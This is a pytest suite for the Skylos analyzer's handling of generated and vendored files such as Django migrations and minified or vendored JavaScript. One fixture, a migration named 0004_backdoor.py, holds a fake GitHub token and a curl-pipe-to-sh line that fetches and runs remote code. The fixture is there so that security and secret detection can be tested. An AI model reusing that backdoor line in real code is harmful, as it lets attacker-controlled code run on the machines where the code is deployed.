"""Generated and vendored files are skipped by default, never silently."""

import json
import textwrap
from pathlib import Path

from skylos.analyzer import analyze
from skylos.constants import DEFAULT_EXCLUDE_FOLDERS
from skylos.core.generated_files import (
    REASON_DJANGO_MIGRATION,
    REASON_MINIFIED,
    REASON_STATIC_LIB,
    REASON_VENDORED_BANNER,
    classify_generated_file,
    partition_generated_files,
)

DJANGO_MIGRATION = """
from django.db import migrations, models


class Migration(migrations.Migration):
    dependencies = [("shop", "0001_initial")]
    operations = [
        migrations.AddField("order", "note", models.TextField(default="")),
    ]
"""


def _write(root: Path, files: dict[str, str]) -> None:
    for name, source in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(  # skylos: ignore[SKY-D324] pytest tmp_path
            textwrap.dedent(source).lstrip(), encoding="utf-8"
        )


def _scan(root: Path, **kwargs) -> dict:
    kwargs.setdefault("exclude_folders", sorted(DEFAULT_EXCLUDE_FOLDERS))
    return json.loads(analyze(str(root), conf=0, grep_verify=False, **kwargs))


def _files(result, bucket):
    return {Path(item["file"]).name for item in result.get(bucket) or []}


def test_django_migration_shape_is_detected(tmp_path):
    _write(
        tmp_path,
        {
            "shop/migrations/__init__.py": "",
            "shop/migrations/0002_note.py": DJANGO_MIGRATION,
        },
    )
    path = tmp_path / "shop/migrations/0002_note.py"
    assert classify_generated_file(path, tmp_path) == REASON_DJANGO_MIGRATION


def test_non_django_migrations_folders_are_scanned(tmp_path):
    _write(
        tmp_path,
        {
            # A test package that happens to be called "migrations".
            "app/tests/migrations/__init__.py": "",
            "app/tests/migrations/test_constraints.py": "def test_x():\n    pass\n",
            # Flask-Migrate/Alembic layout: env.py and versions/*.py.
            "migrations/env.py": "from alembic import context\n",
            "migrations/versions/abc123_add.py": "def upgrade():\n    pass\n",
            # A Migration class that is not Django's.
            "tool/migrations/__init__.py": "",
            "tool/migrations/0001.py": "class Migration(Base):\n    pass\n",
            # Django-shaped file, but not inside a Python package.
            "loose/migrations/0001_initial.py": DJANGO_MIGRATION,
            # A module named migrations.py holding real app code.
            "db/migrations.py": DJANGO_MIGRATION,
        },
    )
    for name in (
        "app/tests/migrations/test_constraints.py",
        "migrations/env.py",
        "migrations/versions/abc123_add.py",
        "tool/migrations/0001.py",
        "loose/migrations/0001_initial.py",
        "db/migrations.py",
    ):
        assert classify_generated_file(tmp_path / name, tmp_path) is None, name


def test_vendored_frontend_files_are_detected(tmp_path):
    _write(
        tmp_path,
        {
            "app/static/js/lib/widget.js": "window.widget = 1;\n",
            "app/static/css/lib/theme.css": "body {}\n",
            "web/dist2/app.min.js": "var a=1;\n",
            "web/vendorish/jquery.js": (
                "/*! jQuery v3.6.1 | (c) OpenJS Foundation and other "
                "contributors | jquery.org/license */\n!function(){}();\n"
            ),
            "web/ui/bootstrap.js": (
                "/*!\n  * Bootstrap v4.6.2 (https://getbootstrap.com/)\n"
                "  * Copyright 2011-2022 The Bootstrap Authors\n"
                "  * Licensed under MIT\n  */\n(function(){})();\n"
            ),
        },
    )
    assert (
        classify_generated_file(tmp_path / "app/static/js/lib/widget.js", tmp_path)
        == REASON_STATIC_LIB
    )
    assert (
        classify_generated_file(tmp_path / "app/static/css/lib/theme.css", tmp_path)
        == REASON_STATIC_LIB
    )
    assert (
        classify_generated_file(tmp_path / "web/dist2/app.min.js", tmp_path)
        == REASON_MINIFIED
    )
    for name in ("web/vendorish/jquery.js", "web/ui/bootstrap.js"):
        assert (
            classify_generated_file(tmp_path / name, tmp_path) == REASON_VENDORED_BANNER
        ), name


def test_app_code_lookalikes_are_not_vendored(tmp_path):
    _write(
        tmp_path,
        {
            # lib/ outside a static tree is app code.
            "src/lib/helpers.js": "export const x = 1;\n",
            # Python under static/**/lib is not a front-end asset.
            "app/static/lib/build.py": "x = 1\n",
            # A plain copyright header without a version or preserve marker.
            "src/app.js": "/* Copyright 2024 Acme Inc. */\nexport const y = 2;\n",
            # A version string without a licence marker.
            "src/version.js": "/*! build v1.2.3 */\nexport const v = 3;\n",
            # The banner must open the file.
            "src/late.js": "'use strict';\n/*! Lib v1.0.0 | MIT License */\n",
        },
    )
    for name in (
        "src/lib/helpers.js",
        "app/static/lib/build.py",
        "src/app.js",
        "src/version.js",
        "src/late.js",
    ):
        assert classify_generated_file(tmp_path / name, tmp_path) is None, name


def test_explicit_files_and_include_folders_are_never_skipped(tmp_path):
    _write(
        tmp_path,
        {
            "shop/migrations/__init__.py": "",
            "shop/migrations/0002_note.py": DJANGO_MIGRATION,
            "app/static/js/lib/widget.js": "window.widget = 1;\n",
            "app/static/js/lib/other.js": "window.other = 1;\n",
        },
    )
    files = [
        tmp_path / "shop/migrations/0002_note.py",
        tmp_path / "app/static/js/lib/widget.js",
        tmp_path / "app/static/js/lib/other.js",
    ]

    analyzed, scope = partition_generated_files(
        files,
        tmp_path,
        keep_paths=["shop/migrations"],
        explicit_files=[tmp_path / "app/static/js/lib/widget.js"],
    )

    assert analyzed == files[:2]
    assert scope.report_only == {}
    assert scope.excluded == {files[2]: REASON_STATIC_LIB}


def test_scan_skips_generated_files_and_says_so(tmp_path):
    _write(
        tmp_path,
        {
            "shop/__init__.py": "",
            "shop/models.py": "def unused_helper():\n    return 1\n",
            "shop/migrations/__init__.py": "",
            "shop/migrations/0002_note.py": DJANGO_MIGRATION
            + "\n\ndef unused_in_migration(apps, schema_editor):\n    pass\n",
            "shop/static/js/lib/vendor.js": "function vendorUnused() {}\n",
            "shop/static/js/app.min.js": "function minUnused(){}\n",
        },
    )

    result = _scan(tmp_path, skip_generated=True)

    generated = result["analysis_summary"]["generated_files"]
    assert generated["skipped_count"] == 3
    assert generated["by_reason"] == {
        "django_migration": 1,
        "minified": 1,
        "vendored_static_lib": 1,
    }
    assert generated["files"]["django_migration"] == ["shop/migrations/0002_note.py"]
    assert generated["include_with"] == "--include-generated"
    unused_functions = {item["simple_name"] for item in result["unused_functions"]}
    assert "unused_helper" in unused_functions
    assert "unused_in_migration" not in unused_functions
    assert "vendorUnused" not in unused_functions
    assert "minUnused" not in unused_functions
    assert "Migration" not in {item["simple_name"] for item in result["unused_classes"]}
    # Vendored files are not part of the scan at all.
    assert result["analysis_summary"]["total_files"] == 4


def test_scan_without_skip_still_reports_generated_files(tmp_path):
    _write(
        tmp_path,
        {
            "shop/__init__.py": "",
            "shop/migrations/__init__.py": "",
            "shop/migrations/0002_note.py": DJANGO_MIGRATION
            + "\n\ndef unused_in_migration(apps, schema_editor):\n    pass\n",
            "shop/static/js/lib/vendor.js": "function vendorUnused() {}\n",
        },
    )

    result = _scan(tmp_path)

    assert "generated_files" not in result["analysis_summary"]
    assert "unused_in_migration" in {
        item["simple_name"] for item in result["unused_functions"]
    }
    assert result["analysis_summary"]["total_files"] == 4


def test_code_used_only_by_a_migration_stays_alive(tmp_path):
    _write(
        tmp_path,
        {
            "shop/__init__.py": "",
            "shop/signals.py": (
                "def create_group(name):\n    return name\n\n\n"
                "def really_unused():\n    return 2\n"
            ),
            "shop/migrations/__init__.py": "",
            "shop/migrations/0003_groups.py": (
                "from django.db import migrations\n"
                "from shop.signals import create_group\n\n\n"
                "def forwards(apps, schema_editor):\n"
                "    create_group('admins')\n\n\n"
                "class Migration(migrations.Migration):\n"
                "    operations = [migrations.RunPython(forwards)]\n"
            ),
        },
    )

    result = _scan(tmp_path, skip_generated=True)

    unused_functions = {item["simple_name"] for item in result["unused_functions"]}
    assert "create_group" not in unused_functions
    assert "really_unused" in unused_functions


def test_migrations_keep_security_and_secret_findings(tmp_path):
    _write(
        tmp_path,
        {
            "shop/__init__.py": "",
            "shop/migrations/__init__.py": "",
            "shop/migrations/0004_backdoor.py": (
                "import os\n"
                "from django.db import migrations\n\n"
                "API_TOKEN = 'ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8" + "'\n\n\n"
                "def forwards(apps, schema_editor):\n"
                "    os.system('curl ' + os.environ['HOOK'] + ' | sh')\n\n\n"
                "def unused_in_migration(apps, schema_editor):\n    pass\n\n\n"
                "class Migration(migrations.Migration):\n"
                "    operations = [migrations.RunPython(forwards)]\n"
            ),
        },
    )

    result = _scan(
        tmp_path,
        skip_generated=True,
        enable_danger=True,
        enable_secrets=True,
        enable_quality=True,
    )

    assert result["analysis_summary"]["generated_files"]["skipped_count"] == 1
    assert "0004_backdoor.py" in _files(result, "danger")
    assert "0004_backdoor.py" in _files(result, "secrets")
    assert "0004_backdoor.py" not in _files(result, "quality")
    assert "unused_in_migration" not in {
        item["simple_name"] for item in result["unused_functions"]
    }


def test_scan_of_a_named_migration_file_is_not_skipped(tmp_path):
    _write(
        tmp_path,
        {
            "shop/__init__.py": "",
            "shop/migrations/__init__.py": "",
            "shop/migrations/0002_note.py": DJANGO_MIGRATION
            + "\n\ndef unused_in_migration(apps, schema_editor):\n    pass\n",
        },
    )

    result = json.loads(
        analyze(
            str(tmp_path / "shop/migrations/0002_note.py"),
            conf=0,
            grep_verify=False,
            skip_generated=True,
        )
    )

    assert "generated_files" not in result["analysis_summary"] or (
        result["analysis_summary"]["generated_files"]["skipped_count"] == 0
    )
    assert "unused_in_migration" in {
        item["simple_name"] for item in result["unused_functions"]
    }
